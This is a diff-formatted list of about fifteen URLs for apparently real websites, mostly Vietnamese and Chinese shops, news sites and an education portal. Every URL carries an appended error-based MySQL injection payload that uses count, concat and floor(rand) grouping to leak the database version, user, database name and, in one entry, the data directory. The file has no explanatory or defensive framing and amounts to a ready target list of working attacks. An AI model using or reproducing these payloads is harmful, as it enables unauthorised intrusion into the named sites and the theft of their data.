@@ -1,0 +1,46 @@
+http://phim.beeboo.vn//search/bula') /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))bula From Information_Schema.Tables Group By bula)a)*/-- -.html
+
+http://phim14.net//search/bula') /*!and (select 1 from(select count(*),concat((select concat_ws(0x7c,user(),database(),version())),floor(rand(0)*2))bula from information_schema.columns group by bula) md)*/-- -.html
+
+http://phimhdhay.net/search/bula'+and+(select*from(select+count(*)from (select+1+union+select+2+union+select+3)x+group+by+concat(mid((select+concat_ws(0x3a,version(),database(),user())+from+INFORMATION_SCHEMA.TABLES+limit +0,1),1,64),floor(rand(0)*2)))z)--+.html
+
+http://www.artoffurniture.ca/product.php?product_id=(@:=1)||@ group by concat(version(),0x3a,database(),0x3a,user(),!@)having@||min(@:=0)
+
+
+http://haiduong.edu.vn/haiduongedu/vn/portal/InfoDetail.jsp?area=1&cat=1724&ID=1053 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select  Concat(version(),0x7c,database(),0x7c,user())),floor(rAnd(0)*2),CHAR  (124))x From Information_Schema.Tables Group By x)a)*/--
+
+
+http://www.liche365.com/shop.php?ac=view&shopid=589 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -&action=addOil
+
+
+http://lirenxueyuan.cn/shop.php?ac=view&shopid=3 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+
+http://nhacvnn.net/#Search,1,bula' /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+
+http://www.fursuit.co.uk/category.php?id=2 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+http://violetqb.com/home/index.php?page=rules&id=1 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+http://www.cfmoto.cn/Product.php
+?id=2 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+http://zonotek.vn/index.php?content=readNews&id=203 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+http://www.baidoanews.com/view.php?id=6728 /*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+http://www.postef.com/index.php?lng=vi&m=main&c=lst_pro&cid=8+And+(Select 1 From(Select Count( * ),Concat(CHAR(124),(Select substr(Concat(version(),0x7c,database(),0x7c,user(),0x7c,@@datadir),1,150)),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)
+
+
+http://vuihoc.vn/shop/shopping/?id=-6/*!And (Select 1 From(Select Count(*),Concat(CHAR (124),(Select concat_ws(0x3a,version(),user(),database())),floor(rAnd(0)*2),CHAR (124))x From Information_Schema.Tables Group By x)a)*/-- -
+
+
+
+
